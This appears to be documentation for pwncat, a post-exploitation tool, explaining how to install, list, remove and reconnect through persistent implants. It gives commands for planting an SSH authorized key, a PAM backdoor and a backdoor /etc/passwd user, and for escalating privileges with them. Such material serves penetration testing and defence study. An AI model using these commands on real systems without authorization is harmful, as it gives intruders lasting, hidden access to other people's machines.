Persistent Implants
===================

pwncat provides the ability to install and manage persistent implants on target hosts. The ``implant``
module provides a way to manage installed implants. Installing an individual implant is accomplished by
simply executing the implant module itself.

Installing An Implant
---------------------

pwncat comes with a few standard implants. Installing the standard implants can be accomplished easily
as seen below.

.. code-block:: bash

   # Install an authorized public key as the current user
   (local) pwncat$ run implant.authorized_key key=./id_rsa
   # Install an authorized key as another user (requires root access)
   (local) pwncat$ run implant.authorized_key user=john key=./id_rsa
   # Install a pam backdoor module
   (local) pwncat$ run implant.pam password=s3cr3ts
   # Install a backdoor user within /etc/passwd
   (local) pwncat$ run implant.passwd backdoor_user=pwncat backdoor_pass=pwncat

List Installed Implants
-----------------------

The generic ``implant`` module can be used to list installed implants.

.. code-block:: bash

   # List installed implants
   (local) pwncat$ run implant list
   # The default subcommand is to list
   (local) pwncat$ run implant

Escalate Using Local Implant
----------------------------

The generic ``implant`` module provides the capability to utilize local implants to escalate privileges
to another user. This can be used to utilize an explicit escalation vice performing automated escalation
via the ``escalate`` command. During execution of the ``implant escalate`` subcommand, you will be
prompted for the implants to utilize.

.. code-block:: bash

   # Attempt escalation with a local implant; will be prompted for which implant(s) to use
   (local) pwncat$ run implant escalate

Removing Implants
-----------------

Once again, the ``implant`` module provides the ability to remove installed implants. As with the escalate
subcommand, you will be prompted for which implant to remove after running the module.

.. code-block:: bash

   # Remove one or more implants
   (local) pwncat$ run implant remove

Reconnecting With Implants
--------------------------

Remote implants provide a way to reconnect to a target at will. Reconnecting can be accomplished by simply
executing the pwncat entrypoint and specifying either the IP address or unique host ID of the target.
pwncat will automatically check for installed implants and attempt to reconnect. See the Usage section for
examples.
